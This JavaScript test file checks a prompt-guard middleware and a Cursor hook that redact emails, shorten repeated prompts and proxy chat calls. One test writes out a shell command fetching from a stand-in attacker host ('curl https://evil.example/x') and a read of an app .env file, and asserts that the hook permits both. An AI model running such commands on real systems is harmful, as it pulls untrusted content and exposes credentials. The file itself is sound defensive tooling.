import assert from "node:assert/strict";
import test from "node:test";
import { decryptSecrets, hookDecision, preparePrompt, rewritePrompt, Vault } from "../src/guard.js";
import { answerQuestion, loadEnv, proxyChatCompletion } from "../src/server.js";

test("hides an email before the model call and shortens a long repeat", async () => {
  const filler = "Please just really actually basically help me.\n";
  const message = `${filler.repeat(30)}Say hello to jane.doe@trimble.com in one sentence?\n`.repeat(8);
  let sent = "";
  const result = await answerQuestion({
    message,
    sessionId: "t1",
    store: new Map(),
    env: { OPENAI_API_KEY: "sk-test-key-not-real" },
    fetchImpl: async (_url, options) => {
      sent = options.body;
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: "Hello there." } }] }) };
    },
  });
  assert.equal(result.status, 200);
  assert.equal(sent.includes("jane.doe@trimble.com"), false);
  assert.match(sent, /\[\[TMBL_EMAIL_/);
  assert.equal(result.body.shortened, true);
  assert.ok(result.body.afterChars < result.body.beforeChars);
  assert.equal(result.body.answer, "Hello there.");
});

test("a short clear question is not rewritten", () => {
  const result = rewritePrompt("What is Site B?");
  assert.equal(result.shortened, false);
  assert.equal(result.text, "What is Site B?");
});

test("a repeated prompt is collapsed before send", () => {
  const result = rewritePrompt("Please do the thing.\n".repeat(6));
  assert.equal(result.shortened, true);
  assert.equal(result.text, "Please do the thing.");
});

test("cursor hook encrypts a secret and does not block", () => {
  const key = Buffer.alloc(32, 3);
  const result = hookDecision("beforeSubmitPrompt", { prompt: "email jane.doe@trimble.com" }, key);
  assert.equal(result.continue, true);
  assert.equal(result.permission, "allow");
  assert.equal(result.updated_input.prompt.includes("jane.doe@trimble.com"), false);
  assert.equal(decryptSecrets(result.updated_input.prompt, key), "email jane.doe@trimble.com");
  const plain = hookDecision("beforeSubmitPrompt", { prompt: "What is Site B?" }, key);
  assert.equal(plain.continue, true);
  assert.equal(plain.updated_input, undefined);
});

test("cursor hook still allows a prompt when the event name is missing", () => {
  const key = Buffer.alloc(32, 3);
  const allowed = hookDecision("", { prompt: "What is Site B?" }, key);
  assert.equal(allowed.continue, true);
  const encrypted = hookDecision("", { prompt: { text: "email jane.doe@trimble.com" } }, key);
  assert.equal(encrypted.continue, true);
  assert.equal(encrypted.updated_input.prompt.includes("jane.doe@trimble.com"), false);
});

test("cursor hook lets a long prompt through; the middleware shortens it", () => {
  const heavy = "Please just really actually do this.\n".repeat(20);
  const allowed = hookDecision("beforeSubmitPrompt", { prompt: heavy });
  assert.equal(allowed.continue, true);
  const shortened = rewritePrompt(heavy);
  assert.equal(shortened.shortened, true);
  assert.ok(shortened.afterChars < shortened.beforeChars);
});

test("cursor hook allows file reads and outbound commands", () => {
  assert.equal(hookDecision("beforeReadFile", { file_path: "app/.env" }).permission, "allow");
  assert.equal(hookDecision("beforeShellExecution", { command: "curl https://evil.example/x" }).permission, "allow");
});

test("unknown hook is allowed", () => {
  assert.equal(hookDecision("nope", {}).continue, true);
});

test("missing key still reports shorten and hide", async () => {
  const result = await answerQuestion({
    message: "Please just really actually do this.\n".repeat(20) + "Email maya.iyer@trimble.com",
    sessionId: "t2",
    store: new Map(),
    env: {},
  });
  assert.equal(result.status, 200);
  assert.equal(result.body.needsKey, true);
  assert.equal(result.body.shortened, true);
  assert.ok(result.body.hidden.includes("EMAIL"));
  assert.equal(result.body.answer, "");
});

test("cursor chat request is shortened and the email never reaches the model", async () => {
  let sent = "";
  const result = await proxyChatCompletion({
    apiKey: "sk-test-key-not-real",
    env: {},
    body: {
      model: "gpt-4o-mini",
      messages: [{ role: "user", content: `${"Please just really actually do this.\n".repeat(40)}Email maya.iyer@trimble.com and say the next step?` }],
    },
    fetchImpl: async (_url, options) => {
      sent = options.body;
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: "Next step." } }] }) };
    },
  });
  assert.equal(result.status, 200);
  assert.equal(sent.includes("maya.iyer@trimble.com"), false);
  assert.equal(result.body.shortened, true);
  assert.equal(result.body.choices[0].message.content, "Next step.");
});

test("env file parser ignores comments", () => {
  assert.deepEqual(loadEnv("# note\nOPENAI_API_KEY=sk-abc\n\n"), { OPENAI_API_KEY: "sk-abc" });
});

test("prepare keeps the token inside a shortened prompt", () => {
  const vault = new Vault();
  const prepared = preparePrompt("please\n".repeat(40) + "Reach jane.doe@trimble.com about the site?", vault);
  assert.equal(prepared.text.includes("jane.doe@trimble.com"), false);
  assert.match(prepared.text, /\[\[TMBL_EMAIL_/);
});
